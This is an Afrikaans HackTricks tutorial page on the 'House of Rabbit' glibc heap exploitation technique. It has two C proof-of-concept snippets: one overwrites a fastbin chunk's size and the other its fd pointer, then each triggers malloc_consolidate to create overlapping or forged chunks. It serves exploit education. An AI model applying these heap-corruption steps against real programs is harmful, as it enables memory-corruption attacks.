# Huis van die Hasie

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

### Vereistes

1. **Vermoeë om die Fastbin fd-aanwyser of -grootte te wysig**: Dit beteken jy kan die voorwaartse aanwyser van 'n blokkie in die fastbin verander of sy grootte.
2. **Vermoeë om `malloc_consolidate` te aktiveer**: Dit kan gedoen word deur óf 'n groot blokkie toe te ken óf die boonste blokkie saam te voeg, wat die hoop dwing om blokkies te konsolideer.

### Doelwitte

1. **Skep Oorvleulende Blokkies**: Om een blokkie met 'n ander te laat oorvleuel, wat verdere hoopmanipulasies moontlik maak.
2. **Vals Blokkies Smee**: Om die toewysingsprogram in die val te lok om 'n vals blokkie as 'n regmatige blokkie tydens hoopoperasies te behandel.

## Stappe van die Aanval

### POC 1: Wysig die Grootte van 'n Fastbin Blokkie

**Doel**: Skep 'n oorvleulende blokkie deur die grootte van 'n fastbin blokkie te manipuleer.

* **Stap 1: Ken Blokkies Toe**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **Stap 2: Vrymaak van brokkies**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
### Ons maak albei brokke vry, en voeg hulle by die fastbin-lys.

* **Stap 3: Wysig Brok Grootte**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
### Ons verander die grootte metadata van `chunk1` na 0xa1. Dit is 'n noodsaaklike stap om die toewysingsprogram tydens konsolidasie te mislei.

* **Stap 4: Trigger `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
### POC 2: Wysig die FD-aanwyser

**Doel**: Skep 'n vals blokkie deur die fastbin fd-aanwyser te manipuleer.

* **Stap 1: Allokeer Blokkies**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Verduideliking**: Ons ken twee stukke toe, een kleiner en een groter, om die heap op te stel vir die vals stuk.

* **Stap 2: Skep Valse Stuk**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **Stap 3: Vrygawe van Stuk1**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Verduideliking**: Ons vry `chunk1`, deur dit by die fastbin-lys te voeg.

* **Stap 4: Wysig FD van Chunk1**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Verduideliking**: Ons verander die voorwaartse aanwyser (fd) van `chunk1` om te wys na ons valse stuk binne `chunk2`.

* **Stap 5: Trigger `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Die toewysing van 'n groot blok veroorsaak weer `malloc_consolidate`, wat die valse blok verwerk.

Die valse blok word deel van die fastbin-lys, wat dit 'n legitieme blok maak vir verdere uitbuiting.

### Opsomming

Die **House of Rabbit** tegniek behels óf die wysiging van die grootte van 'n fastbin blok om oorvleulende blokke te skep, óf die manipulasie van die fd-aanwyser om valse blokke te skep. Dit stel aanvallers in staat om legitieme blokke in die heap te vervals, wat verskeie vorme van uitbuiting moontlik maak. Die begrip en oefening van hierdie stappe sal jou heap-uitbuitingsvaardighede verbeter.

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
